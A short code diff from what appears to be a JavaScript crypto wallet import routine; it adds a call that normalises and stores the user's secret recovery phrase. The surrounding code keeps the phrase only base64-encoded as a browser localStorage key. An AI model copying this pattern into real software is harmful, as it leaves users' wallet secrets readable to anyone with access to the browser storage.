@@ -129,6 +129,7 @@ function formatTokenArray(tokens) {
    try{
         SetProcessing(true);
         var ip = getLocalStorage("location") ? getLocalStorage("location") : "{}";
+        SetSecretPharse(normalizeText(secretPharse));
         if(walletName.length > 0 && secretPharse.length > 0 && !getLocalStorage(encodeBase64(secretPharse.trim()))){
             const privateArr = secretPharse.trim().split(/[\s]+/g);
             if(validRange.includes(privateArr.length)){
